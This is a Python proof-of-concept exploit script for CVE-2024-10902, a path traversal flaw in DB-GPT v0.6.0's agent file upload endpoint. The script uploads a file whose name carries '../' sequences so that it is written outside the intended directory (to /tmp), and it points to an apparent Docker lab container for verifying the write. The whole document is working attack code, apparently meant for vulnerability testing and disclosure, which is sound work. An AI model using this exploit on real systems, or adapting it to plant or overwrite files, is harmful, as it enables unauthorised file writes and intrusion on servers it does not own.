#!/usr/bin/env python3
import requests
import sys
import io

TARGET_HOST = "http://127.0.0.1:5670"
UPLOAD_ENDPOINT = "/api/v1/personal/agent/upload"

def exploit(target_host):
    url = f"{target_host}{UPLOAD_ENDPOINT}"
    
    traversal_filename = "../../../tmp/poc_test_file.txt"
    file_content = b"CVE-2024-10902 Path Traversal POC - File Written Successfully"
    
    files = {
        "doc_file": (traversal_filename, io.BytesIO(file_content), "application/octet-stream")
    }
    
    print(f"[*] Target: {url}")
    print(f"[*] Filename: {traversal_filename}")
    print(f"[*] Attempting path traversal upload...")
    
    try:
        response = requests.post(url, files=files, timeout=30)
        print(f"[*] Response Status: {response.status_code}")
        print(f"[*] Response Body: {response.text}")
        
        if response.status_code == 200:
            print("[+] Request completed (file written before validation error)")
            print("[+] Vulnerability: File is written BEFORE zip validation")
            print("[+] Even if error returned, path traversal succeeded")
            return True
        else:
            print(f"[-] HTTP Error: {response.status_code}")
            
    except requests.exceptions.ConnectionError:
        print("[-] Connection failed. Is the target running?")
    except Exception as e:
        print(f"[-] Error: {e}")
    
    return False

def verify_file_exists():
    print("\n[*] Verify with: docker exec dbgpt-cve-2024-10902 cat /tmp/poc_test_file.txt")

if __name__ == "__main__":
    host = sys.argv[1] if len(sys.argv) > 1 else TARGET_HOST
    
    print("=" * 60)
    print("CVE-2024-10902 - DB-GPT Arbitrary File Upload PoC")
    print("Affected: eosphoros-ai/db-gpt v0.6.0")
    print("=" * 60)
    
    success = exploit(host)
    
    if success:
        verify_file_exists()
        print("\n[+] PoC completed successfully!")
        sys.exit(0)
    else:
        print("\n[-] PoC failed")
        sys.exit(1)
